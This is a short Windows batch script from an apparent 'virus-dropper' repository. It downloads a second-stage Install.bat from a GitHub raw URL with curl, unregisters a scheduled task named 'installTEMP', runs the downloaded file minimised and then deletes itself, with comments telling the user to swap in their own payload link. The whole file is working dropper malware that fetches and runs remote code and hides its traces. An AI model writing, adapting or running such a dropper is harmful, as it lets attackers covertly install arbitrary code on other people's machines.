@echo off

::Create a copy of install.bat, and edit items inside as directed
::Edit this link to the DIRECT download link of the new install.bat
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/withoutRICKROLL.bat" --output "Install.bat"
::do not change --output

powershell -Command "Unregister-ScheduledTask -TaskName 'installTEMP' -Confirm:$false"
start /min Install.bat
call :deleteSelf&exit
:deleteSelf
start /b "" cmd /c del "%~f0"&exit
